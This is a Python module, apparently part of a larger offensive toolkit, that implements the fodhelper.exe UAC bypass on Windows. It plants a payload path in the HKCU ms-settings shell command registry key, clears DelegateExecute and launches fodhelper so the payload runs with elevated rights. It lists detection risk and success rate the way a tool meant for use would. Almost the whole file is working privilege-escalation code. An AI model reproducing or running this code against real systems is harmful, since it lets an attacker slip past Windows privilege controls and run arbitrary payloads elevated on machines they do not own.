"""
Fodhelper UAC Bypass Module
Bypasses UAC using fodhelper.exe registry hijacking.

How it works:
1. fodhelper.exe is a trusted Windows binary that auto-elevates
2. It checks HKCU registry for ms-settings shell command
3. We write our payload path to that registry location
4. When fodhelper runs, it executes our payload elevated

Works on: Windows 10 up to build 17763 (1809)
"""

from pathlib import Path

import sys

sys.path.append(str(Path(__file__).parent.parent))
from ..core.base import UACBypassBase

# Windows-specific imports
try:
    import winreg

    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False


class FodhelperBypass(UACBypassBase):
    """UAC bypass using fodhelper.exe."""

    METHOD_NAME = "fodhelper"
    DESCRIPTION = "Fodhelper.exe UAC bypass (Windows 10)"
    MIN_VERSION = 10
    MAX_BUILD = 17763  # Patched after 1809
    DETECTION_RISK = "Medium"
    SUCCESS_RATE = 0.85

    # Registry path that fodhelper checks
    REG_PATH = r'Software\Classes\ms-settings\shell\open\command'

    # Fodhelper executable path
    FODHELPER_PATH = r'C:\Windows\System32\fodhelper.exe'

    def __init__(self, output_dir: str = "uac_bypasses", verbose: bool = False):
        """
        Initialize the fodhelper bypass.

        Args:
            output_dir: Directory for storing output files
            verbose: Enable verbose logging
        """
        super().__init__(output_dir, verbose)
        self.log("Fodhelper bypass module initialized", "SUCCESS")

    def bypass(self, payload_path: str) -> bool:
        """
        Execute fodhelper UAC bypass.

        Args:
            payload_path: Path to payload executable

        Returns:
            True if successful, False otherwise
        """
        if not WINDOWS_AVAILABLE:
            self.log("Windows registry not available", "ERROR")
            return False

        self.log("Configuring registry for fodhelper bypass...", "INFO")

        try:
            # Create registry key
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.REG_PATH)

            # Set default value to payload path
            winreg.SetValueEx(key, '', 0, winreg.REG_SZ, payload_path)

            # Set DelegateExecute to empty (required for bypass)
            winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')

            winreg.CloseKey(key)

            # Track for cleanup
            self.modified_registry.append(
                (winreg.HKEY_CURRENT_USER, self.REG_PATH, '')
            )

            self.log("Registry configured successfully", "SUCCESS")

            # Execute fodhelper
            self.log("Triggering fodhelper.exe...", "INFO")

            success = self.execute_process(self.FODHELPER_PATH, wait=False, timeout=3)

            return success

        except Exception as e:
            self.log(f"Fodhelper bypass failed: {e}", "ERROR")
            return False


if __name__ == "__main__":
    bypass = FodhelperBypass(verbose=True)
    print(f"\nMethod: {bypass.METHOD_NAME}")
    print(f"Description: {bypass.DESCRIPTION}")
    print(f"Success Rate: {bypass.SUCCESS_RATE * 100:.0f}%")